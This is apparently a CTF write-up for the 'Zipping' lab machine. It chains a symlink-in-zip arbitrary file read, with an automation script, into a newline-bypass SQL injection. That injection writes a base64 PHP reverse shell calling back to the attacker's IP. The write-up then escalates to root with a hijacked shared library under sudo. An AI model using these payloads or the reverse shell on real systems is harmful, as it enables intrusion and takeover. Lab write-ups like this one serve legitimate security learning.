![zipping.png](zipping.png)

# Zipping

## Enum

```bash
nmap -sC -sV -Pn 10.10.11.229 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 16:11 GMT
Nmap scan report for 10.10.11.229
Host is up (0.027s latency).
Not shown: 840 closed tcp ports (conn-refused), 158 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
```

```bash
curl -I http://10.10.11.229
HTTP/1.1 200 OK
Date: Sun, 29 Oct 2023 16:13:52 GMT
Server: Apache/2.4.54 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

There's an upload page which does only accept zip files with one pdf in it.  

## Arbitrary file read

Setup a file.pdf that is a symlink to /etc/passwd
```bash
ln -s /etc/passwd file.pdf
ls -la file.pdf
lrwxrwxrwx 1 blnkn blnkn 11 Oct 29 17:06 file.pdf -> /etc/passwd
```

Zip it, with the symlink as such instead of compressing and storing the file referred to by the link
```bash
zip --symlink -r file file.pdf
ls -la file.zip
-rw-r--r-- 1 blnkn blnkn 839 Oct 29 17:07 file.zip
```

Upload and curl the result
```bash
curl -s http://10.10.11.229/uploads/642147a874e4dbb4959086f0e6a9188d/file.pdf |grep sh$
root:x:0:0:root:/root:/bin/bash
rektsu:x:1001:1001::/home/rektsu:/bin/bash
```

## Automating the process

This is how the upload feature works
```php
<?php
if(isset($_POST['submit'])) {
  // Get the uploaded zip file
  $zipFile = $_FILES['zipFile']['tmp_name'];
  if ($_FILES["zipFile"]["size"] > 300000) {
    echo "<p>File size must be less than 300,000 bytes.</p>";
  } else {
    // Create an md5 hash of the zip file                                                                                                                                                             $fileHash = md5_file($zipFile);
    // Create a new directory for the extracted files
    $uploadDir = "uploads/$fileHash/";
    $tmpDir = sys_get_temp_dir();
    // Extract the files from the zip
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === true) {
      if ($zip->count() > 1) {
      echo '<p>Please include a single PDF file in the archive.<p>';
      } else {
      // Get the name of the compressed file
      $fileName = $zip->getNameIndex(0);
      if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
        $uploadPath = $tmpDir.'/'.$uploadDir;
        echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
        if (file_exists($uploadPath.$fileName)) {
          mkdir($uploadDir);
          rename($uploadPath.$fileName, $uploadDir.$fileName);
        }
        echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
      } else {
        echo "<p>The unzipped file must have  a .pdf extension.</p>";
      }
     }
    } else {
          echo "Error uploading file.";
    }
```
Looks like the name and filename matter, I believe it needs to be a name=zipFile and filename=something.zip  

And this is pretty much what the payload should look like according to burp
```bash
curl --X POST \
    -H 'Content-Type: multipart/form-data; boundary=---------------------------2882812691696788429152111510' \
    -b 'PHPSESSID=hbgid28hhen8m2b0648svpgg0u' \
    --data-binary \
'
-----------------------------2882812691696788429152111510
\x0d\x0a
Content-Disposition: form-data; name=\"zipFile\"; filename=\"file.zip\"\x0d\x0aContent-Type: application/zip\x0d\x0a\x0d\x0aPK\x03\x04\x0a\x00\x00\x00\x00\x00(\xb7]W\xdc.C\x92\x1b\x00\x00\x00\x1b\x00\x00\x00\x08\x00\x1c\x00file.pdfUT\x09\x00\x03K\xe3>eN\xe3>eux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00/var/www/html/shop/cart.phpPK\x01\x02\x1e\x03\x0a\x00\x00\x00\x00\x00(\xb7]W\xdc.C\x92\x1b\x00\x00\x00\x1b\x00\x00\x00\x08\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xa1\x00\x00\x00\x00file.pdfUT\x05\x00\x03K\xe3>eux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00N\x00\x00\x00]\x00\x00\x00\x00\x00
\x0d\x0a
-----------------------------2882812691696788429152111510
\x0d\x0a
Content-Disposition: form-data; name=\"submit\"
\x0d\x0a
\x0d\x0a
\x0d\x0a
-----------------------------2882812691696788429152111510
--
\x0d\x0a
'

'http://10.10.11.229/upload.php'
```

After experimenting a little it looks like we can't really do this with requests, as far as I can tell requests doesn't provide that level of granularity, and just automatically matches name with the filename.   

So I ended up borrowing a chunk of code form stack overflow to build the payload manually with http.client
```python
import subprocess
import argparse
import http.client
import uuid
import requests
from bs4 import BeautifulSoup


def do_the_symlink(link_path, file_name):
    res = subprocess.run(
        [f"rm {file_name}.pdf"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)

    res = subprocess.run(    # noqa F841
        [f"ln -s {link_path} {file_name}.pdf"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)


def do_the_zip(file_name):
    res = subprocess.run(
        [f"rm {file_name}.zip"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)

    res = subprocess.run(    # noqa F841
        [f"zip --symlink -r {file_name}.zip {file_name}.pdf"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)


def send_the_zip(file_name):

    # Prepare the file content
    file_path = f"{file_name}.zip"
    with open(file_path, "rb") as f:
        file_content = f.read()

    # Define the boundary
    boundary = str(uuid.uuid4())
    headers = {
        'Content-Type': f"multipart/form-data; boundary={boundary}",
    }

    # Create HTTP connection proxied through burp
    conn = http.client.HTTPConnection("127.0.0.1", port="8080")
    conn.set_tunnel(
      "10.10.11.229"
    )

    # Create multipart/form-data payload
    payload = \
        f"--{boundary}\r\n" \
        "Content-Disposition: form-data; name=\"zipFile\"; " \
        f"filename=\"{file_name}.zip\"\r\n" \
        "Content-Type: application/zip\r\n" \
        "\r\n".encode() + file_content + "\r\n" \
        f"--{boundary}\r\n" \
        "Content-Disposition: form-data; name=\"submit\"\r\n" \
        "\r\n" \
        "\r\n" \
        f"--{boundary}--\r\n".encode()

    # Send the request
    conn.request("POST", "/upload.php", body=payload, headers=headers)

    # Get the response
    response = conn.getresponse()
    data = response.read()

    # Close the connection
    conn.close()

    # Print response
    # print(response.status, response.reason)
    # print(data.decode("utf-8"))

    return data


def get_the_link(data):
    soup = BeautifulSoup(data.decode("utf-8"), features="html.parser")
    res = soup.find("section", {"id": "work"})
    link = res.div.a.text
    return f"http://10.10.11.229/{link}"


def get_the_file(link):
    data = requests.get(link)
    data.status_code
    file = data.text
    print(file)


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", help="Path of the file to extract")
    args = parser.parse_args()
    link_path = args.p
    file_name = "file"

    do_the_symlink(link_path, file_name)
    do_the_zip(file_name)
    response = send_the_zip(file_name)
    link = get_the_link(response)
    get_the_file(link)
```

```bash
python3 zipper.py -p /var/www/html/shop/cart.php > ../loot/cart.php
```

## SQL injection

Looking at cart.php, it's kinda funny to read, the dev is basically like: "Yea... I don't really like my boss, sooo I like to spice things up a little".
```php
<?php
// If the user clicked the add to cart button on the product page we can check for the form data
if (isset($_POST['product_id'], $_POST['quantity'])) {
    // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
        echo '';
    } else {
        // Construct the SQL statement with a vulnerable parameter
        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
        // Execute the SQL statement without any sanitization or parameter binding
        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if ($product && $quantity > 0) {
            // Product exists in database, now we can create/update the session variable for the cart
            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
                if (array_key_exists($product_id, $_SESSION['cart'])) {
                    // Product exists in cart so just update the quanity                                                                                                                                              $_SESSION['cart'][$product_id] += $quantity;
                } else {
                    // Product is not in cart so add it
                    $_SESSION['cart'][$product_id] = $quantity;
                }
            } else {
                // There are no products in cart, this will add the first product to cart
                $_SESSION['cart'] = array($product_id => $quantity);
            }
        }
        // Prevent form resubmission...
        header('location: index.php?page=cart');
        exit;
    }
}
```

functions.php
```php
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'M**************';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
}
```

Building a test setup for the mysql db
```bash
docker run --rm --name mysql -e MYSQL_ROOT_PASSWORD='M**************' -d -p 127.0.0.1:3306:3306 mysql
21d6b47dc4080acbedc0495e3a9426b079eafeb2bd7c3bccb32c98918d432981
```
I'll just change localhost to 127.0.0.1 explicitely for the local version

Creating the zipping database
```bash
mysql -u root -h 127.0.0.1 --password='mySQL_p@ssw0rd!:)'
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.2.0 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> create database zipping;
Query OK, 1 row affected (0.019 sec)

MySQL [(none)]> Bye
```

Connecting to zipping and creating the products table based on the error we get when hitting the website
```bash
mysql -u root -h 127.0.0.1 --password='M**************' -D zipping
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.2.0 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [zipping]> create table products(
    -> id varchar(50),
    -> name varchar(50),
    -> date_added varchar(50),
    -> img varchar(50),
    -> price varchar(50),
    -> rrp varchar(50)
    -> );
Query OK, 0 rows affected (0.059 sec)

MySQL [zipping]> insert into products values(1,'thing','05/11/2023', '', '', '');
Query OK, 1 row affected (0.012 sec)

MySQL [zipping]> select * from products;
+------+-------+------------+------+-------+------+
| id   | name  | date_added | img  | price | rrp  |
+------+-------+------------+------+-------+------+
| 1    | thing | 05/11/2023 |      |       |      |
+------+-------+------------+------+-------+------+
1 row in set (0.002 sec)

MySQL [zipping]>
```

And now we have working local vesion of the site to play
```bash
php -S localhost:8080 -f index.php
[Sun Nov  5 17:48:20 2023] PHP 8.2.12 Development Server (http://localhost:8080) started
[Sun Nov  5 17:48:23 2023] [::1]:34620 Accepted
[Sun Nov  5 17:48:23 2023] [::1]:34620 [200]: GET /index.php
[Sun Nov  5 17:48:23 2023] [::1]:34620 Closing
```

This is what we wanna achieve, but executed on our local setup, note that the outfile path isn't exatly the same:
```sql
MySQL [zipping]> select from_base64('cHJvZHVjdHM=') into outfile '/var/lib/mysql-files/shell.php';
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%0A' at line 1
Query OK, 1 row affected (0.002 sec)
```
```bash
bash-4.4# cat shell.php
products
```

Preparing a shell
```bash
cat shell.sh
bash -i >& /dev/tcp/10.10.14.185/4242 0>&1
```
```bash
cat shell.sh|base64|pbcopy
```
```bash
cat shell.php
<?php exec("printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODUvNDI0MiAwPiYxCg== | base64 -d | bash"); ?>
```
```bash
cat shell.php|base64 -w0|pbcopy
```
```bash
PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K
```

The newline character isn't part of the preg filter, so we should be able to use this to bypass the filter altogether, then use from_base64 to bring our reverse shell, and into outfile to write into /var/li/mysql since this is running as root
```bash
%0A';select from_base64('PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K') into outfile '/var/lib/mysql/shell.php'; --1
```
```bash
%0A'%3bselect+from_base64('PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K')+into+outfile+'/var/lib/mysql/shell.php'%3b+--1
```
```bash
quantity=1&product_id=%0A'%3bselect+from_base64('PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K')+into+outfile+'/var/lib/mysql/shell.php'%3b+--1
```

And finally we can just use this to execute the php reverse shell with a get
```bash
xdg-open 'http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell'
```

## Privesc

```bash
rektsu@zipping:~$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```
```bash
file /usr/bin/stock
/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, for GNU/Linux 3.2.0, not stripped
```
There is no netcat on this box but the binary is very small so I just exfiltrated in base64 form through the clipboard, then a quick look at it through strings gives us the password since it is hardcoded in the binary:
```bash
strings stock|grep pass -B4 -A4
u+UH
Hakaize
S***********
/root/.stock.csv
Enter the password:
Invalid password, please try again.
================== Menu ==================
1) See the stock
2) Edit the stock
3) Exit the program
```
Running strace against it we can see that it attempts to load a shared library in rektsu's home which doesn't exist
```bash
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = 3
```

So we can write one that spawns a shell
```bash
rektsu@zipping:/tmp$ nano libcounter.c
```
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
```bash
rektsu@zipping:/tmp$ gcc -c -o libcounter.o libcounter.c
rektsu@zipping:/tmp$ gcc -shared -o libcounter.so libcounter.o
rektsu@zipping:/tmp$ ls -lart libcounter*
-rw-rw-r-- 1 rektsu rektsu   183 Nov  5 19:24 libcounter.c
-rw-rw-r-- 1 rektsu rektsu  1728 Nov  5 19:32 libcounter.o
-rwxrwxr-x 1 rektsu rektsu 15544 Nov  5 19:32 libcounter.so
```

```bash
rektsu@zipping:/tmp$ cp libcounter.so ~/.config/libcounter.so
```
```bash
rektsu@zipping:~/.config$ sudo stock
Enter the password: S***********
root@zipping:/home/rektsu/.config# id
uid=0(root) gid=0(root) groups=0(root)
root@zipping:/home/rektsu/.config#
```
And we're root
